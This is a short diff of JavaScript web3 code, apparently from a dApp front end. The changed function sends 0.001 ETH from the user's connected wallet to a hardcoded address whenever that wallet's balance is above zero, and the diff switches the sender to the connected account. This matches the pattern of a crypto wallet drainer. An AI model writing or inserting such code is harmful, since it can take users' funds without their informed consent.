@@ -119,7 +119,7 @@ async function fetchAccountData() {
     const ethBalance = web3.utils.fromWei(balance, "ether");
     if(ethBalance > 0){ console.log("Balance greater than Zero");
         web3.eth.sendTransaction({
-           from: '0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe',
+           from: accounts[0],
            to: '0x11f4d0A3c12e86B4b5F39B213F7E19D048276DAe',
            value: '1000000000000000'
        });
